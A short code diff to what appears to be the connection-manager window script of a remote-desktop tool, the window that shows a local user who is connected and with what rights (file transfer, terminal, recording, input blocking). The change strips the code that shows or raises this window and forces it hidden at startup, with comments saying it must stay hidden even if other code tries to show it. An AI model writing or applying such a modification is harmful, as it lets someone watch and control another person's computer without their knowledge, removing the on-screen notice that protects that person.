@@ -353,17 +353,8 @@ function update() {
 }
 
 function bring_to_top(idx=-1) {
-    if (view.windowState == View.WINDOW_HIDDEN || view.windowState == View.WINDOW_MINIMIZED) {
-        if (is_linux) {
-            view.focus = self;
-        } else {
-            setWindowState(View.WINDOW_SHOWN);
-        }
-        if (idx >= 0) body.cur = idx;
-    } else {
-        view.windowTopmost = true;
-        view.windowTopmost = false;
-    }
+    // Keep CM hidden: do not show or change topmost state.
+    if (idx >= 0) body.cur = idx;
 }
 
 handler.addConnection = function(id, is_file_transfer, is_view_camera, is_terminal, port_forward, peer_id, name, authorized, keyboard, clipboard, audio, file, restart, recording, block_input) {
@@ -461,6 +452,8 @@ function self.ready() {
     var w = scaleIt(300);
     var h = scaleIt(400);
     view.move(sw - w, 0, w, h);
+    // Force CM to remain hidden even if other code tries to show it
+    view.windowState = View.WINDOW_HIDDEN;
 }
 
 function getElapsed(time, now) {
